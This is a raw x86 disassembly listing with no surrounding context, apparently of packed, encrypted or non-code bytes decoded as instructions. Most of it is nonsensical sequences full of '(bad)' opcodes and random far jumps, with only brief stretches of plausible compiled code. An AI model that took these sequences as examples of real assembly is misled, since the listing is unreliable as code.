  4131c3:	dec    edx
  4131c4:	loopne 0x413245
  4131c6:	pop    esp
  4131c7:	outs   dx,DWORD PTR ds:[esi]
  4131c8:	pusha  
  4131c9:	mov    ds:0x269bc776,al
  4131ce:	pop    eax
  4131cf:	call   0x5f303844
  4131d4:	xor    al,0xcd
  4131d6:	jns    0x4131d3
  4131d8:	das    
  4131d9:	clc    
  4131da:	inc    esi
  4131db:	or     BYTE PTR [edi+0x56],ah
  4131de:	popf   
  4131df:	pop    edx
  4131e0:	jle    0x4131a9
  4131e2:	jge    0x41323f
  4131e4:	jb     0x4131cd
  4131e6:	stos   BYTE PTR es:[edi],al
  4131e7:	aaa    
  4131e8:	sub    bh,BYTE PTR [eax-0x31]
  4131eb:	inc    edx
  4131ec:	jne    0x413196
  4131ee:	sub    al,0xfa
  4131f0:	(bad)  
  4131f1:	std    
  4131f2:	jnp    0x413244
  4131f4:	adc    BYTE PTR [esi],al
  4131f6:	or     BYTE PTR [edi+0x7b8558fd],dh
  4131fc:	xor    eax,DWORD PTR [esi-0x2e]
  4131ff:	in     eax,0xc6
  413201:	pop    eax
  413202:	adc    BYTE PTR [ecx+0x791e6742],dh
  413208:	adc    al,0x48
  41320a:	mov    dh,0x9b
  41320c:	fld    TBYTE PTR [esi+0x7dcf4924]
  413212:	xchg   esp,eax
  413213:	mov    WORD PTR [ebp+ebx*8-0x34eb84d3],cs
  41321a:	fnstsw WORD PTR [ebp-0x61]
  41321d:	mov    esp,0xc66f6881
  413222:	inc    esp
  413223:	sub    al,0x23
  413225:	mov    bh,0x17
  413227:	test   eax,0x74a9d960
  41322c:	xchg   ebx,eax
  41322d:	stc    
  41322e:	jns    0x413252
  413230:	or     DWORD PTR [ebx-0x1459219e],esi
  413236:	xchg   edi,eax
  413237:	or     BYTE PTR [eax-0x29f66e0c],bh
  41323d:	add    eax,0x19de01ae
  413242:	repnz (bad) 
  413245:	pop    edx
  413246:	mov    dl,0x58
  413248:	xchg   esp,eax
  413249:	call   0x96a0:0xa90ddbe8
  413250:	and    bl,bl
  413252:	test   BYTE PTR [eax-0xc65d2f1],0x86
  413259:	std    
  41325a:	inc    esp
  41325b:	mov    ecx,0xf6218fa6
  413260:	jb     0x4132d9
  413262:	mov    al,0xac
  413264:	icebp  
  413265:	xor    DWORD PTR [ebx-0x20],0xba90f81d
  41326c:	ret    
  41326d:	push   es
  41326e:	mov    edi,0xe3ff1942
  413273:	mov    eax,0xd362714a
  413278:	pop    ebp
  413279:	shl    BYTE PTR [eax],cl
  41327b:	nop
  41327c:	dec    eax
  41327d:	pop    esi
  41327e:	and    eax,0xf0993862
  413283:	call   0xf57:0xc4092475
  41328a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41328b:	push   0x2b
  41328d:	inc    eax
  41328e:	lea    eax,[edx]
  413290:	dec    esi
  413291:	call   0x8fb3:0x5717d8c6
  413298:	shl    ch,cl
  41329a:	faddp  st(0),st
  41329c:	stos   BYTE PTR es:[edi],al
  41329d:	push   ss
  41329e:	or     edi,edi
  4132a0:	out    dx,eax
  4132a1:	lea    esp,[esi-0xf]
  4132a4:	lea    edx,[eax+0x49a4fa79]
  4132aa:	xor    BYTE PTR [ebx-0x26],0x1f
  4132ae:	adc    BYTE PTR [eax+0xfc3bb12],cl
  4132b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132b5:	inc    eax
  4132b6:	or     dl,bh
  4132b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132b9:	mov    DWORD PTR [ecx-0x63],ecx
  4132bc:	inc    esp
  4132bd:	inc    esp
  4132be:	sbb    DWORD PTR [ecx-0x21],eax
  4132c1:	stos   BYTE PTR es:[edi],al
  4132c2:	jecxz  0x4132c3
  4132c4:	pop    ebp
  4132c5:	sub    BYTE PTR [edi-0x36],al
  4132c8:	add    ebx,DWORD PTR [esi+ecx*2+0x24]
  4132cc:	in     eax,dx
  4132cd:	std    
  4132ce:	pop    edx
  4132cf:	pop    ebp
  4132d0:	fistp  QWORD PTR [ecx-0x4eac6d13]
  4132d6:	hlt    
  4132d7:	xchg   edx,eax
  4132d8:	jne    0x4132ed
  4132da:	cdq    
  4132db:	shr    ah,0x84
  4132de:	pop    ss
  4132df:	mov    ds:0xe20cb5da,al
  4132e4:	scas   eax,DWORD PTR es:[edi]
  4132e5:	shl    BYTE PTR [ebp+edi*8-0x56c59afe],0xe5
  4132ed:	jge    0x4132da
  4132ef:	int    0x39
  4132f1:	into   
  4132f2:	out    0x2c,eax
  4132f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132f5:	dec    esp
  4132f6:	push   ebp
  4132f7:	adc    BYTE PTR [esi+0x909f5fb],ah
  4132fd:	sbb    eax,0xb5bac1dc
  413302:	imul   eax,DWORD PTR [ebp+0x2d],0x5f
  413306:	jge    0x413288
  413308:	rcr    DWORD PTR ds:0x42f21382,1
  41330e:	rol    BYTE PTR [edi],cl
  413310:	adc    al,0x9b
  413312:	push   0x91e9dd82
  413317:	(bad)  
  413318:	xchg   ecx,eax
  413319:	stos   BYTE PTR es:[edi],al
  41331a:	jmp    0xb6410f65
  41331f:	pop    esi
  413320:	push   es
  413321:	sub    al,0x20
  413323:	std    
  413324:	mov    ecx,0xedaf1626
  413329:	xchg   ecx,eax
  41332a:	fwait
  41332b:	cli    
  41332c:	cmp    edx,DWORD PTR [eax+0x5f]
  41332f:	ret    
  413330:	mov    BYTE PTR [ecx+0x373904d4],bh
  413336:	repnz push esp
  413338:	cmp    BYTE PTR [ebx+0x28],ah
  41333b:	mov    edx,0x6249b406
  413340:	xchg   esi,eax
  413341:	clc    
  413342:	xor    eax,0xd3e70e8a
  413347:	fcmovnu st,st(3)
  413349:	rcl    DWORD PTR [esi],cl
  41334b:	add    ebx,DWORD PTR [ebx+eiz*2-0xbc4ebbd]
  413352:	retf   0x5b74
  413355:	int    0xcb
  413357:	or     cl,BYTE PTR [esi+0x24]
  41335a:	jae    0x413329
  41335c:	outs   dx,BYTE PTR ds:[esi]
  41335d:	xor    eax,0x8e50be7b
  413362:	frstor [ecx]
  413364:	outs   dx,DWORD PTR ds:[esi]
  413365:	jne    0x4133d5
  413367:	mov    eax,ds:0x6650d27b
  41336c:	outs   dx,DWORD PTR ds:[esi]
  41336d:	xor    eax,0x5774af53
  413372:	out    0x41,al
  413374:	out    dx,eax
  413375:	aaa    
  413376:	int    0x24
  413378:	idiv   esi
  41337a:	push   edi
  41337b:	add    al,ah
  41337d:	push   cs
  41337e:	inc    ecx
  41337f:	mov    al,ds:0x34775302
  413384:	dec    edi
  413385:	ja     0x4133a9
  413387:	mov    edx,?
  413389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41338a:	aaa    
  41338b:	int3   
  41338c:	cdq    
  41338d:	ret    0xd182
  413390:	sub    dh,BYTE PTR [ecx+0x4b8d2dea]
  413396:	fstp   st(4)
  413398:	hlt    
  413399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41339a:	cli    
  41339b:	fcom   QWORD PTR [ebx]
  41339d:	fimul  WORD PTR [edi-0x7e25b5ed]
  4133a3:	stos   DWORD PTR es:[edi],eax
  4133a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133a5:	dec    eax
  4133a6:	(bad)  
  4133a7:	(bad)  
  4133a8:	pop    edi
  4133a9:	mov    ebx,0x9405a7cc
  4133ae:	mov    WORD PTR [ecx-0x2f2d162a],gs
  4133b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133b5:	add    al,0xd8
  4133b7:	sub    DWORD PTR [ecx-0x7b06f3e6],ecx
  4133bd:	jo     0x413427
  4133bf:	push   edi
  4133c0:	fbld   TBYTE PTR [eax-0xcca45a6]
  4133c6:	sub    eax,0x15ea597c
  4133cb:	(bad)  
  4133cc:	pop    eax
  4133cd:	test   eax,0x6467c29e
  4133d2:	dec    ebx
  4133d3:	pop    ss
  4133d4:	test   BYTE PTR [edx+0x463785d2],ch
  4133da:	push   esi
  4133db:	cmp    eax,0xd8bea0bf
  4133e0:	mov    eax,ds:0x60d6e504
  4133e5:	ins    BYTE PTR es:[edi],dx
  4133e6:	push   0xe98b7099
  4133eb:	push   ss
  4133ec:	mov    al,ds:0x1b18909d
  4133f1:	adc    BYTE PTR [edx-0x4fe42483],ah
  4133f7:	icebp  
  4133f8:	dec    esi
  4133f9:	xchg   ebp,eax
  4133fa:	mov    al,ds:0x7ffc5dca
  4133ff:	retf   
  413400:	gs hlt 
  413402:	stc    
  413403:	xor    BYTE PTR [edx-0x41],bh
  413406:	iret   
  413407:	push   ds
  413408:	jno    0x413411
  41340a:	leave  
  41340b:	test   al,0xa3
  41340d:	xor    BYTE PTR [edx+0xa998542],ah
  413413:	cdq    
  413414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413415:	add    eax,0x1d6451ae
  41341a:	pop    esi
  41341b:	popa   
  41341c:	jg     0x41343f
  41341e:	pop    edx
  41341f:	xor    ecx,esp
  413421:	push   cs
  413422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413423:	cmc    
  413424:	jae    0x4133b0
  413426:	loopne 0x4133b2
  413428:	mov    esp,0x75e917b2
  41342d:	fisubr DWORD PTR [edx]
  41342f:	xor    eax,0xd7970936
  413434:	sub    eax,0x38567918
  413439:	cdq    
  41343a:	fistp  QWORD PTR [edx]
  41343c:	(bad)  
  41343d:	pusha  
  41343e:	jp     0x41341e
  413440:	sbb    esp,esi
  413442:	mov    edi,0x6de0e82a
  413447:	pusha  
  413448:	sub    al,0xb1
  41344a:	ja     0x413480
  41344c:	xchg   esi,eax
  41344d:	cmp    ebx,DWORD PTR [eax]
  41344f:	je     0x41349d
  413451:	lock rol DWORD PTR [ebx-0x22],0x59
  413456:	fisub  WORD PTR [ebx]
  413458:	out    dx,eax
  413459:	add    BYTE PTR [esi+esi*4+0x5bc7b664],0x50
  413461:	fidiv  DWORD PTR ds:0xd4c09ecd
  413467:	adc    BYTE PTR [ecx],dh
  413469:	aaa    
  41346a:	xchg   edi,eax
  41346b:	out    dx,al
  41346c:	sub    cl,bh
  41346e:	jbe    0x413438
  413470:	in     eax,dx
  413471:	out    dx,eax
  413472:	ds cld 
  413474:	sbb    edx,edx
  413476:	dec    eax
  413477:	ins    BYTE PTR es:[edi],dx
  413478:	push   ecx
  413479:	pop    ss
  41347a:	(bad)  
  41347b:	dec    ebx
  41347c:	fcomp  st(2)
  41347e:	lock rcl DWORD PTR [edx+0x74],1
  413482:	xor    esi,eax
  413484:	mov    dl,0xba
  413486:	pop    ecx
  413487:	and    ch,BYTE PTR [esp+esi*4+0x56da331b]
  41348e:	push   ebp
  41348f:	ret    0x4050
  413492:	inc    eax
  413493:	pop    edi
  413494:	dec    esp
  413495:	add    BYTE PTR [edx+0x603f4e60],dl
  41349b:	test   DWORD PTR [ebp+eax*2+0x5c],ecx
  41349f:	dec    ecx
  4134a0:	inc    edi
  4134a1:	inc    ecx
  4134a2:	addr16 jne 0x4134eb
  4134a5:	adc    edx,0x9573
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x42205c
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx+0x5303709f]
  4134d4:	gs mov esp,0x18184264
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    BYTE PTR [ecx],bl
  4134df:	clc    
  4134e0:	cmp    ebx,edi
  4134e2:	xlat   BYTE PTR ds:[ebx]
  4134e3:	leave  
  4134e4:	or     dl,BYTE PTR [ecx+eiz*8+0x46]
  4134e8:	push   ds
  4134e9:	aam    0x78
  4134eb:	shl    DWORD PTR [ebx],cl
  4134ed:	cmp    eax,0x4b3b02a1
  4134f2:	sar    DWORD PTR [esi+edx*8+0x1a],cl
  4134f6:	jmp    0xb835:0xc65c79b
  4134fd:	aaa    
  4134fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134ff:	pop    esp
  413500:	cmp    al,0x4c
  413502:	cs (bad) 
  413504:	outs   dx,DWORD PTR ds:[esi]
  413505:	sti    
  413506:	sub    dl,BYTE PTR es:[esi]
  413509:	cmp    edx,eax
  41350b:	das    
  41350c:	ds mov eax,0xce1a9873
  413512:	cs pop ss
  413514:	out    dx,eax
  413515:	loopne 0x41354c
  413517:	pop    ds
  413518:	shl    BYTE PTR [edi],cl
  41351a:	stc    
  41351b:	(bad)  
  41351c:	sti    
  41351d:	inc    esi
  41351e:	adc    ah,BYTE PTR [ebp-0x25]
  413521:	inc    edx
  413522:	mov    ah,0xa7
  413524:	fist   DWORD PTR ds:0x1541bb0f
  41352a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41352b:	arpl   WORD PTR ds:0xa8b0665e,bp
  413531:	mov    cl,0x76
  413533:	fiadd  DWORD PTR [eax+0x3f]
  413536:	ds aam 0x2b
  413539:	and    ebx,DWORD PTR [ebx+edi*1]
  41353c:	mov    eax,0x91743697
  413541:	mov    ds:0x69becde9,al
  413546:	push   esp
  413547:	inc    esp
  413548:	mov    edi,0xa4fd3887
  41354d:	sbb    esp,DWORD PTR [esi-0x68]
  413550:	(bad)  
  413551:	push   ds
  413552:	fwait
  413553:	es pop edx
  413555:	ins    BYTE PTR es:[edi],dx
  413556:	mov    bl,0x49
  413558:	push   0xffffffa9
  41355a:	in     eax,0x1
  41355c:	int3   
  41355d:	bound  edi,QWORD PTR [edi+0x6c]
  413560:	mov    ds:0xd4b07cf7,al
  413565:	stos   DWORD PTR es:[edi],eax
  413566:	stc    
  413567:	stc    
  413568:	loope  0x4135b5
  41356a:	pop    edx
  41356b:	jbe    0x4135da
  41356d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41356e:	(bad)  
  41356f:	iret   
  413570:	or     DWORD PTR [ecx-0x2f],edi
  413573:	pop    edx
  413574:	dec    esi
  413575:	push   ebx
  413576:	icebp  
  413577:	fs out 0x3e,al
  41357a:	adc    eax,0x7a22af6b
  41357f:	arpl   sp,di
  413581:	add    esi,eax
  413583:	mov    eax,0x844202ad
  413588:	push   es
  413589:	clc    
  41358a:	mov    al,0x6f
  41358c:	mov    ds:0x7cdfc0a,al
  413591:	mov    dh,BYTE PTR ds:0xf1bdc2cd
  413597:	es jp  0x413526
  41359a:	jo     0x413577
  41359c:	sbb    eax,0x5845e14d
  4135a1:	jo     0x413552
  4135a3:	fcomp  DWORD PTR [esi+ebx*2+0x18]
  4135a7:	sub    dh,BYTE PTR [ebp+0xf]
  4135aa:	jp     0x413610
  4135ac:	xor    eax,0xd40a1f2d
  4135b1:	jl     0x413551
  4135b3:	out    0xa1,eax
  4135b5:	and    cl,dh
  4135b7:	mov    ah,0x28
  4135b9:	add    BYTE PTR [edi],ah
  4135bb:	stos   DWORD PTR es:[edi],eax
  4135bc:	test   al,0x94
  4135be:	sti    
  4135bf:	dec    eax
  4135c0:	sbb    BYTE PTR [ebx],0xcc
  4135c3:	fist   DWORD PTR [eax-0x19522bd5]
  4135c9:	mov    esi,DWORD PTR [edi-0x1bbd8f00]
  4135cf:	xchg   edi,eax
  4135d0:	retf   
  4135d1:	cmp    dh,bh
  4135d3:	out    dx,al
  4135d4:	imul   eax,DWORD PTR [edx+0x1],0xffffffc3
  4135d8:	mov    WORD PTR [ecx-0x78],?
  4135db:	outs   dx,BYTE PTR ds:[esi]
  4135dc:	jo     0x41357a
  4135de:	jne    0x413659
  4135e0:	int    0x92
  4135e2:	inc    DWORD PTR [edx-0x61445d17]
  4135e8:	mov    ch,BYTE PTR [ebx]
  4135ea:	(bad)  
  4135eb:	in     eax,dx
  4135ec:	xchg   ebp,eax
  4135ed:	jle    0x4135fc
  4135ef:	into   
  4135f0:	mov    cs,WORD PTR [ebp+0x24b989d1]
  4135f6:	mov    ecx,0xd37edf9e
  4135fb:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4135fd:	fmulp  st(7),st
  4135ff:	pop    esi
  413600:	cli    
  413601:	hlt    
  413602:	(bad)  
  413603:	bound  ecx,QWORD PTR [edi]
  413605:	in     eax,0x13
  413607:	mov    esi,0x62c79ba6
  41360c:	ror    DWORD PTR [edx],1
  41360e:	dec    ecx
  41360f:	cmp    ecx,DWORD PTR [esi-0x99181c7]
  413615:	jmp    0x41360e
  413617:	lahf   
  413618:	or     esp,DWORD PTR [ebp-0x397b579]
  41361e:	inc    ebp
  41361f:	add    esi,DWORD PTR [eax+0x25]
  413622:	in     eax,dx
  413623:	pop    ecx
  413624:	xor    BYTE PTR [edx+ecx*8-0x696afcf2],0xd1
  41362c:	jae    0x413624
  41362e:	sub    eax,0x3b6ddc43
  413633:	in     al,0x17
  413635:	retf   0x579e
  413638:	mov    ebp,0xdfa49c10
  41363d:	stos   DWORD PTR es:[edi],eax
  41363e:	adc    al,BYTE PTR [edx]
  413640:	shl    DWORD PTR [eax],1
  413642:	sbb    esp,ebx
  413644:	mov    ebx,gs
  413646:	pop    eax
  413647:	int3   
  413648:	push   es
  413649:	ret    
  41364a:	fs pop edx
  41364c:	pusha  
  41364d:	mov    dl,0x8a
  41364f:	jbe    0x4136cd
  413651:	pop    ebp
  413652:	mov    bl,0x2d
  413654:	imul   edi,DWORD PTR [edi-0x26],0x15
  413658:	fisttp WORD PTR [esi+0x5627545e]
  41365e:	cs ret 0x478e
  413662:	popf   
  413663:	adc    BYTE PTR [edx],0xff
  413666:	aam    0x13
  413668:	int    0x7a
  41366a:	xchg   BYTE PTR [ecx],dh
  41366c:	cmp    al,0x1d
  41366e:	adc    BYTE PTR [edi],ah
  413670:	mul    ecx
  413672:	dec    edx
  413673:	xchg   ecx,eax
  413674:	sub    ch,ch
  413676:	jmp    0x658ddf52
  41367b:	fwait
  41367c:	clc    
  41367d:	pop    ss
  41367e:	cmp    DWORD PTR [ebp-0x352b7065],0xdb5f6e7e
  413688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413689:	inc    edx
  41368a:	add    bl,BYTE PTR [edx-0xd]
  41368d:	std    
  41368e:	dec    edi
  41368f:	scas   al,BYTE PTR es:[edi]
  413690:	adc    DWORD PTR [edx],0x4236655e
  413696:	lds    eax,FWORD PTR [ebx]
  413698:	mov    ecx,0x60793b13
  41369d:	in     al,0x5d
  41369f:	ror    DWORD PTR [ebx],1
  4136a1:	mov    eax,esp
  4136a3:	pop    ds
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	mov    ecx,0xa45f90d8
  4136aa:	xor    BYTE PTR [edi-0x3a],dh
  4136ad:	fcom   DWORD PTR [edi]
  4136af:	sub    DWORD PTR [ecx-0x35],edi
  4136b2:	sbb    al,0x8f
  4136b4:	inc    edx
  4136b5:	sbb    DWORD PTR [eax],esi
  4136b7:	es test al,0xa6
  4136ba:	mov    ds:0x34c4317e,al
  4136bf:	in     eax,0x85
  4136c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136c3:	mov    edi,ebp
  4136c5:	jp     0x413738
  4136c7:	cmp    eax,0xf353f9d7
  4136cc:	jo     0x413659
  4136ce:	aas    
  4136cf:	push   ss
  4136d0:	call   0x43c6:0x65a84a19
  4136d7:	out    dx,eax
  4136d8:	leave  
  4136d9:	cmp    esi,ecx
  4136db:	dec    esi
  4136dc:	popf   
  4136dd:	jg     0x413662
  4136df:	mov    bh,0x6a
  4136e1:	ret    
  4136e2:	loopne 0x4136cd
  4136e4:	js     0x413687
  4136e6:	dec    edx
  4136e7:	retf   0xd80b
  4136ea:	xor    BYTE PTR [ebx],dh
  4136ec:	jns    0x413747
  4136ee:	lahf   
  4136ef:	cli    
  4136f0:	push   ds
  4136f1:	out    0xee,eax
  4136f3:	pop    edx
  4136f4:	out    0xfc,eax
  4136f6:	sbb    eax,0xf4601f43
  4136fb:	and    DWORD PTR [eax-0x50],ecx
  4136fe:	pop    eax
  4136ff:	ret    0x3b1b
  413702:	in     eax,dx
  413703:	mov    edi,0x44370fa6
  413708:	inc    edi
  413709:	sti    
  41370a:	jmp    0x413747
  41370c:	add    ch,BYTE PTR [ebp-0x74]
  41370f:	ss jmp 0xcd57:0xe3ed194e
  413717:	inc    ebp
  413718:	mov    esp,0x6c7c5f06
  41371d:	adc    ecx,DWORD PTR [ecx+eiz*1-0x4a]
  413721:	pop    ebx
  413722:	cmp    ah,BYTE PTR [ebx+0x51190797]
  413728:	sub    al,0x11
  41372a:	retf   0x1707
  41372d:	lds    ebx,FWORD PTR [esi+0x4c8e38fa]
  413733:	js     0x4136bf
  413735:	aam    0xa7
  413737:	or     edx,DWORD PTR [edx+0x1]
  41373a:	retf   0x1414
  41373d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41373e:	and    eax,0xcf328b8c
  413743:	xlat   BYTE PTR ds:[ebx]
  413744:	inc    ebx
  413745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413746:	inc    esi
  413747:	jnp    0x4137c8
  413749:	sub    al,0x45
  41374b:	mov    ah,0xf3
  41374d:	push   esi
  41374e:	sbb    DWORD PTR [esi-0x80],0xffffff99
  413752:	fs push ebp
  413754:	mov    ah,0x7e
  413756:	mov    dl,0x98
  413758:	mov    bl,0xa8
  41375a:	hlt    
  41375b:	(bad)  
  41375c:	fiadd  WORD PTR [edx]
  41375e:	jmp    0x20d3aa49
  413763:	and    BYTE PTR ds:0x372d8d7c,ah
  413769:	sbb    BYTE PTR [ebx-0x1b640b96],cl
  41376f:	retf   
  413770:	imul   DWORD PTR [edx-0x21]
  413773:	xor    eax,0x782cb722
  413778:	jns    0x41376f
  41377a:	and    BYTE PTR [ebp+0x58f5beb1],0xd5
  413781:	in     eax,dx
  413782:	adc    al,0x5
  413784:	add    al,0xf2
  413786:	in     eax,0x54
  413788:	lahf   
  413789:	push   ebp
  41378a:	or     esp,DWORD PTR [edi+0x261f80bb]
  413790:	push   esi
  413791:	mov    bl,0x3a
  413793:	and    esi,edi
  413795:	retf   0x935
  413798:	bound  ecx,QWORD PTR [ecx-0x5d235558]
  41379e:	adc    ebp,DWORD PTR [ebp+0x50421370]
  4137a4:	and    bl,BYTE PTR [eax-0xc]
  4137a7:	add    DWORD PTR es:[edi-0x79e92980],ebx
  4137ae:	fisub  WORD PTR [ebx]
  4137b0:	pop    esp
  4137b1:	push   0x2c2a8408
  4137b6:	bound  ebx,QWORD PTR [ebp+eax*2-0x51]
  4137ba:	icebp  
  4137bb:	add    eax,0xa584df5
  4137c0:	call   0xbab5:0x10493ad6
  4137c7:	sti    
  4137c8:	sub    BYTE PTR [edx+0x17],ah
  4137cb:	mov    eax,0xcb2c85f7
  4137d0:	xchg   ecx,eax
  4137d1:	mov    edi,0xd6caf0f7
  4137d6:	fcom   QWORD PTR [esi+ebx*8-0x57]
  4137da:	imul   eax,eax,0xffffffb8
  4137dd:	and    ecx,DWORD PTR [edi]
  4137df:	test   cl,ah
  4137e1:	mov    BYTE PTR [esi],bh
  4137e3:	dec    edi
  4137e4:	jns    0x4137af
  4137e6:	lods   eax,DWORD PTR ds:[esi]
  4137e7:	or     eax,0x20580c22
  4137ec:	mov    ebp,0x4ae11c8b
  4137f1:	fst    DWORD PTR ds:0x86833a1f
  4137f7:	pushf  
  4137f8:	fwait
  4137f9:	xchg   esi,eax
  4137fa:	dec    ebx
  4137fb:	jg     0x413868
  4137fd:	mov    esp,0x1b4b588
  413802:	inc    edx
  413803:	popf   
  413804:	lods   eax,DWORD PTR ds:[esi]
  413805:	xchg   esi,eax
  413806:	inc    esp
  413807:	(bad)  
  413808:	cld    
  413809:	pop    edi
  41380a:	push   es
  41380b:	pop    ebx
  41380c:	ror    DWORD PTR [ebx],1
  41380e:	sub    dh,0xc0
  413811:	fmul   QWORD PTR [eax]
  413813:	bound  ebp,QWORD PTR [edx+0x40]
  413816:	fs pusha 
  413818:	inc    esi
  413819:	fld    TBYTE PTR [ebx]
  41381b:	inc    edi
  41381c:	jmp    0x41386f
  41381e:	jmp    0xfe9a0ddb
  413823:	adc    ecx,DWORD PTR [ecx]
  413825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413826:	push   ebp
  413827:	aad    0xd5
  413829:	cld    
  41382a:	std    
  41382b:	(bad)  
  41382c:	(bad)  
  41382d:	cmp    al,0x15
  41382f:	add    edi,DWORD PTR [eax-0x27]
  413832:	cs out dx,al
  413834:	pop    ds
  413835:	dec    esi
  413836:	cmp    al,0xa7
  413838:	leave  
  413839:	xchg   edx,eax
  41383a:	mov    DWORD PTR [esi],edx
  41383c:	jb     0x4137c2
  41383e:	lds    edx,FWORD PTR [ebp+0x5b4cab5a]
  413844:	in     eax,dx
  413845:	mov    eax,0xdaec0e4
  41384a:	test   BYTE PTR [edi+0x6ca9c6fb],cl
  413850:	repz cwde 
  413852:	pop    ds
  413853:	cs out dx,al
  413855:	inc    esp
  413856:	clc    
  413857:	and    dl,BYTE PTR [ecx]
  413859:	(bad)  
  41385a:	dec    DWORD PTR [ebp+0x490fdc30]
  413860:	jg     0x41382e
  413862:	xor    ebp,0x3586e5a0
  413868:	pop    ds
  413869:	fadd   DWORD PTR [edx]
  41386b:	mov    eax,ds:0xef1f5aa8
  413870:	cmp    DWORD PTR ds:0x9b4f970e,esp
  413876:	out    dx,eax
  413877:	and    al,cl
  413879:	and    cl,BYTE PTR [esp+edx*4]
  41387c:	dec    edi
  41387d:	jecxz  0x4138b3
  41387f:	call   0x6a1244ab
  413884:	call   0x30e40700
  413889:	std    
  41388a:	fsqrt  
  41388c:	pop    ebp
  41388d:	sub    BYTE PTR [ebp-0x106dff6b],ah
  413893:	cmp    ah,BYTE PTR [edx]
  413895:	call   0x8bea2801
  41389a:	pop    ebp
  41389b:	in     al,0x81
  41389d:	icebp  
  41389e:	mov    ebx,DWORD PTR [ebx]
  4138a0:	add    BYTE PTR [eax],al
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx+0x34],ebp
  4138e5:	mov    ch,0xee
  4138e7:	mov    esi,0x18183af7
  4138ec:	stos   BYTE PTR es:[edi],al
  4138ed:	adc    bl,BYTE PTR [eax]
  4138ef:	sbb    BYTE PTR [ecx+0x6f],dl
  4138f2:	jne    0x4138ec
  4138f4:	jbe    0x41387c
  4138f6:	xchg   edi,eax
  4138f7:	in     al,0xb0
  4138f9:	loop   0x413938
  4138fb:	cmp    dh,BYTE PTR [ebp-0x3cffee0e]
  413901:	idiv   DWORD PTR [ebp+0x18]
  413904:	mov    ds:0xac5dff3,al
  413909:	neg    bl
  41390b:	inc    esp
  41390c:	mov    dh,0x36
  41390e:	cli    
  41390f:	adc    bl,BYTE PTR [edx+0xc]
  413912:	retf   
  413913:	loopne 0x4138ab
  413915:	sbb    al,0x55
  413917:	push   ebx
  413918:	arpl   WORD PTR [esi-0x16],bp
  41391b:	inc    edx
  41391c:	jno    0x413956
  41391e:	sub    al,ah
  413920:	int    0x3d
  413922:	mov    edi,0x45d84b24
  413927:	push   ebx
  413928:	mov    eax,ds:0x3078c9c
  41392d:	mov    edx,0x40b915cf
  413932:	out    dx,al
  413933:	(bad)  
  413934:	call   0xfc56:0xfe55ccba
  41393b:	mov    bh,BYTE PTR [eax+0x1d1a757e]
  413941:	and    al,BYTE PTR [esi]
  413943:	ror    BYTE PTR [esp+esi*4],0x47
  413947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413948:	xor    edi,DWORD PTR [edi]
  41394a:	inc    esi
  41394b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41394c:	int3   
  41394d:	add    eax,0x83041f3e
  413952:	hlt    
  413953:	je     0x4138f1
  413955:	pop    edi
  413956:	(bad)  
  413957:	adc    eax,eax
  413959:	mov    eax,0x8b1c9079
  41395e:	nop
  41395f:	add    DWORD PTR [esi],ecx
  413961:	mov    esi,0x60892cbf
  413966:	inc    ebp
  413967:	push   ss
  413968:	pop    ebx
  413969:	sbb    dl,BYTE PTR [ebp-0x63]
  41396c:	add    al,0x84
  41396e:	mov    esp,fs
  413970:	outs   dx,BYTE PTR ds:[esi]
  413971:	fninit 
  413973:	dec    edx
  413974:	sbb    eax,0xccc8302e
  413979:	jbe    0x413918
  41397b:	jg     0x413980
  41397d:	int    0x4c
  41397f:	xchg   DWORD PTR [ebx],esp
  413981:	leave  
  413982:	xchg   dx,ax
